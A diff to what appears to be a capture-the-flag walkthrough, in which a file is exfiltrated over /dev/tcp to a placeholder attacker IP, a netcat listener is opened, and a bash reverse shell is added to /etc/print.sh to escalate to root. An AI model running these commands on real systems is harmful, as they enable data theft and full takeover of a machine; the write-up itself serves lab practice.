@@ -158,13 +158,7 @@ On the target machine :
 $ bash -c 'cat suspicious.pcapng > /dev/tcp/<attacker_ip>/1235'
 ```
 
-Let's dive into the sequence 7 of the TCP stream on the pcap file :
-
-```txt
-www-data@startup:/home$ sudo -l
-sudo -l
-[sudo] password for www-data: *****
-```
+Let's dive into the sequence 7 of the TCP stream on the pcap file and show the TCP stream, we can see a strange string.
 
 Let's try to connect on the user lennie with this password.
 
@@ -202,8 +196,12 @@ On the attacker machine :
 nc -lnvp 1235
 ```
 
-On the target machine :
+On the target machine, add this lines into /etc/print.sh :
 
 ```bash
-
+bash -c 'exec bash -i &>/dev/tcp/<attack_ip>/1235 <&1'
 ```
+
+Right now, we are root !
+
+Then, get the root flag on /root/root.txt
